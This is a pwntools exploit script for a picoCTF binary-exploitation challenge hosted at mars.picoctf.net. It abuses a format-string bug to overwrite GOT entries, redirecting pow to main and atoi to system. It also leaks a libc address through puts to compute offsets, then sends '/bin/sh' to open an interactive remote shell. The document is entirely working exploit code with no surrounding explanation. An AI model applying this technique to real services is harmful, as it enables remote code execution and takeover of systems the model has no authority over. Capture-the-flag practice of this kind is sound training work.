#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 31929
HOST = "mars.picoctf.net"
exe = context.binary = ELF('./chall_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x00000000004009d2
        	b*0x00000000004008d7
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Overwrite pow -> main()

pow_addr = exe.got.pow
main = exe.sym.main & 0xffff

fmt = f"%{main - 20}c%14$hn".encode()
pl = b'1'
pl += flat(
	fmt.ljust(0x20-1, b"A"),
	pow_addr,
	)
p.sendlineafter(b"A: ", pl)
p.sendlineafter(b"B: ", b'1')

# Leak libc

pl = flat(
	b'1'.ljust(8, b'a'),
	exe.got.puts
	)
# GDB()

p.sendlineafter(b"A: ", pl)
fmt = flat(
	b'2'.ljust(8, b'a'),
	b"%11$s"
	)
p.sendlineafter(b"B: ", fmt)
p.recvuntil(b"2aaaaaaa")
libc_leak = u64(p.recv(6) + b"\0\0")
libc_base = libc_leak - 0x0875a0;
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc_base))

# Overwrite atoi -> system()

system = libc_base + 0x055410

package = {
	(system & 0xffff) - 0x2e: exe.got.atoi,
	(system >> 16 & 0xffff) - 0x2e : exe.got.atoi + 2,
}

order = sorted(package)

pl = flat(
	b'1'.ljust(0x8, b"A"),
	package[order[0]],
	package[order[1]]
	)

p.sendlineafter(b"A: ", pl)

fmt = flat(
	b'1'.ljust(0x8, b'a'),
	f"%{order[0]}c%11$hn".encode(),
	f"%{order[1] - order[0]}c%12$hn".encode()
)

p.sendlineafter(b"B: ", fmt)

p.sendafter(b"A: ", b'/bin/sh\0')

p.interactive()
